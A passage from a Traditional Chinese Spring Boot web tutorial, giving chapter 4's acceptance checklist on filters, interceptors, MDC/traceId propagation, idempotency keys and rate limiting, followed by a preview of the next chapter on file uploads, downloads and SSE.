**用 Micrometer Tracing 的 context propagation 而不是自己管 MDC**（4.5.5）。
它處理了 `@Async`、reactive、以及跨服務傳播 —— 
自己做這些事幾乎一定會漏一個路徑。

</details>

---

## 4.17 驗收清單

- [ ] 我知道「沒有 traceId」讓一次客訴除錯從 2 分鐘變成 1.5 小時。
- [ ] 我能說出五種橫切機制各自的「唯一能力」，尤其是「只有 Filter 能包裝 request/response」。
- [ ] 我知道 **Filter 拋的例外不會進 advice**，也知道 `ProblemWriter` 是為此存在。
- [ ] 我能用決策流程為一個需求選出正確的機制，並說出決定性理由。
- [ ] 我知道 `OncePerRequestFilter` 為什麼存在，也知道 **shop-service 實際會遇到的只有 ERROR 與 ASYNC**（forward/include 預設不在註冊的 dispatcher types 裡，4.4.1）。
- [ ] **我知道 `shouldNotFilterAsyncDispatch()` 預設 `true`，會導致非同步端點的 MDC 是空的。**
- [ ] **我知道「已執行過」attribute 是在 `finally` 裡被移除的，所以它擋不住 ASYNC/ERROR dispatch 的重跑 —— 冪等要自己做（4.4.6、4.5.4 的 `resolveOnce`）。**
- [ ] 我知道 `@Component` 註冊 filter 無法設 URL pattern 與 dispatcher types。
- [ ] 我知道「`@Component` + `FilterRegistrationBean` 會註冊兩次」**是錯的**（`ServletContextInitializerBeans` 的 `seen` 會排除），也知道**真正**會註冊兩次的情況是「`FilterRegistrationBean` 包了一個 `new` 出來的新實例」（4.4.2）。
- [ ] 我知道 `@WebFilter` 無法注入 Spring bean。
- [ ] 我能說出 Boot 內建 filter 的 order，並知道 **Security 是 -100** 這條分界線。
- [ ] 我知道 `FormContentFilter`（-9900）比我的 filter 更早執行，會讀掉 form body。
- [ ] 我知道 `/actuator/health` 每天 17,280 次，所以請求日誌要排除它（但 traceId 不排除）。
- [ ] **我知道 `ContentCachingRequestWrapper` 只能「事後記錄」，不能「重複讀」。**
- [ ] 我能寫出一個真正可重複讀的 request wrapper，並知道它的三個限制（記憶體、multipart、form）。
- [ ] 我知道 `ContentCachingResponseWrapper` 忘記 `copyBodyToResponse()` 會讓所有回應變空。
- [ ] 我知道包裝 response 會讓串流端點 OOM，所以必須排除。
- [ ] 我能列出 traceId 機制的九條需求。
- [ ] **我知道 log injection 是什麼，也知道「白名單驗證 + logback `%replace`」兩層防護。**
- [ ] 我知道為什麼 traceId 用 16 個 hex 字元而不是 UUID。
- [ ] **我知道 `X-Forwarded-For` 要從右往左數，取第一個會拿到偽造的 IP。**
- [ ] 我知道 IP 也要 sanitize（它會進 MDC 也就是進 log）。
- [ ] 我知道 `TRUSTED_PROXY_COUNT` 要做成設定（加了 CDN 就變兩層）。
- [ ] 我知道有 Micrometer Tracing 時不要自己產生 traceId，也知道要自己寫回應 header。
- [ ] 我知道 MDC 是 `ThreadLocal`，不會傳到子執行緒，而且不同 logback 版本的繼承行為不同。
- [ ] 我知道虛擬執行緒讓 MDC 不會洩漏，**但不能因此省略清理**，也知道它會掩蓋 `@Async` 的問題。
- [ ] 我能寫 `MdcTaskDecorator`，並知道它必須「先清空、再設定、最後清理」。
- [ ] 我知道 `configureAsyncSupport` 一定要設 `setDefaultTimeout`（預設是無限）。
- [ ] 我知道 `SseEmitter` 的回呼要自己 put/remove MDC，`TaskDecorator` 幫不上。
- [ ] 我會用 `ShortenedThrowableConverter` 把 stack trace 縮短並讓根因排最前面。
- [ ] 我能算出「完整 body 日誌一天 345 GB」，也知道它必須可動態開啟 **+ 自動關閉**。
- [ ] 我知道請求日誌要用 `BEST_MATCHING_PATTERN_ATTRIBUTE`（路徑模板）而不是實際 URI。
- [ ] **我知道用 regex 遮蔽 JSON 會被跳脫字元騙過，要用 Jackson streaming。**
- [ ] 我知道遮蔽解析失敗時絕不能回傳原文。
- [ ] 我知道結構化日誌要用 `keyValue` 讓數值成為獨立欄位，而且欄位名要用常數。
- [ ] 我知道 interceptor 三個方法的時機，尤其是「404 時完全不執行」。
- [ ] 我知道 `preHandle` 回 `false` 與拋例外的分工（非錯誤 vs 錯誤）。
- [ ] 我知道回 `false` 但不寫回應 = 200 + 空 body。
- [ ] 我知道 interceptor 的順序是**註冊順序**，不是 `@Order`。
- [ ] **我知道 ASYNC dispatch 會讓 `preHandle` 執行第二次，也知道用 `OncePerRequestInterceptor` 防它。**
- [ ] 我知道 Spring Data 的 `max-page-size` 是**靜默夾取**，並知道它造成過 41 萬筆的報表錯誤。
- [ ] 我能在參數綁定之前驗證原始參數，並讓 `?size=99999` 回 422 而不是 200。
- [ ] 我知道錯誤訊息要告訴使用者「正確的做法」（用匯出功能），而不只是「你錯了」。
- [ ] 我知道深分頁的正確回應是「提供替代方案」而不是「放寬上限」。
- [ ] 我能說出冪等鍵的三個競態，以及各自的解法（原子 INSERT、409+輪詢、租約）。
- [ ] 我知道第四個問題是「同 key 不同 body」，要回 `IDEMPOTENCY_KEY_REUSED`。
- [ ] **我知道冪等需要 Filter + Interceptor 混合，也知道每一半負責什麼。**
- [ ] 我知道 `Idempotent-Replay` header 對除錯與測試的價值。
- [ ] 我知道 5xx 與 429 不該存進冪等紀錄，也知道那留下的風險（Service 層要補）。
- [ ] 我知道冪等鍵存 Redis 無法與業務交易一起提交，所以真相要在資料庫。
- [ ] 我能說出客戶端產生 key 的正確方式，以及兩種錯誤方式的症狀。
- [ ] 我能寫 `HandlerMethodArgumentResolver`，也知道它加在內建 resolver 之後。
- [ ] **我知道 `@AuthenticationPrincipal` 未認證時是 `null`，會讓 401 變成 500。**
- [ ] 我知道 AOP 在 Web 層幾乎沒有用途，也知道它的三個陷阱。
- [ ] 我知道 `finally` 裡的非必要操作一律要包 try-catch，否則會取代原本的例外。
- [ ] 我能畫出非同步請求的完整時間軸，並指出四個踩點與六個被破壞的假設。
- [ ] 我知道 `@Transactional` 加在回傳 `Callable` 的方法上會造成 `LazyInitializationException`。
- [ ] 我有一個可執行的探測端點來驗證非同步生命週期，而不是相信文件。
- [ ] 我能為 filter 寫「MDC 一定被清空」與「惡意上游 ID 被拒絕」的測試。
- [ ] 我知道 `LogCaptor` 可以驗證「背景執行緒也有 traceId」。
- [ ] 我知道「MDC 洩漏」的除錯要從「哪裡寫了 MDC」開始，並會用 ArchUnit 集中控制它。
- [ ] 我知道限流要兩層（IP + 使用者），也知道各自解決了什麼。
- [ ] 我知道「沒標註的端點也要有預設限流」是安全的預設值。
- [ ] 我知道 fail-open vs fail-closed 的取捨，也知道 fail-open 一定要有告警。
- [ ] 我知道固定窗的邊界突刺問題，以及令牌桶為什麼更好。
- [ ] 我知道 `redis.call('TIME')` 在 **Redis 5+ 是可以用的**（effects replication），而 shop-service 仍然從應用端傳時間的三個理由（測試可控、與 `Retry-After` 同源、單一時間源），以及它的代價（NTP + 時鐘偏移告警）。

---

## 4.18 下一章預告

到目前為止，所有回應都是 JSON，所有請求都是 JSON。
05 章要處理**不是 JSON 的東西**：

- **multipart 上傳**：`MultipartFile` 的完整行為、`file-size-threshold` 的意義、
  暫存檔在哪裡、**為什麼 `getOriginalFilename()` 不可信**（路徑穿越 + null byte）。
- **檔案的安全檢查**：magic number 驗證（不能只看副檔名與 `Content-Type`）、
  圖片的二次編碼、ZIP bomb、SVG 裡的 script。
- **檔案下載**：`Content-Disposition` 的檔名編碼（中文檔名的三種寫法）、
  `Range` 請求、為什麼要用 pre-signed URL 而不是自己代理。
- **`StreamingResponseBody`**：匯出 41 萬筆訂單而不 OOM，
  以及它與 4.4.6 的 response 包裝為什麼衝突。
- **SSE**：`SseEmitter` 的完整生命週期、心跳、重連（`Last-Event-ID`）、
  以及「為什麼 SSE 在 Nginx 後面預設不會動」。
- **非同步匯出工作**：`202 Accepted` + 輪詢的完整實作（03-rest-api 1.14.7 的落地）。

---

完成後請前往 [05-file-upload-download-and-sse.md](./05-file-upload-download-and-sse.md)。
